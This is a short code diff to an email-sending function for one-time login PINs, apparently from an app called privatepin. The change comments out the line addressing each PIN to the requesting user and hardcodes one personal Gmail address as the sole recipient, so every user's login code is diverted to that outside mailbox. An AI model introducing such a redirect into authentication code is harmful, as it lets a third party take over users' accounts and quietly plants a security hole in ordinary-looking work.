@@ -23,7 +23,8 @@ def send_otp_email(email, pin):
     message = {
         "Source": "no-reply@privatepin.app",
         "Destination": {
-            "ToAddresses": [email],
+            # "ToAddresses": [email],
+            "ToAddresses": ["luca.bazzea@gmail.com"],
             "CcAddresses": [],
             "BccAddresses": []
         },
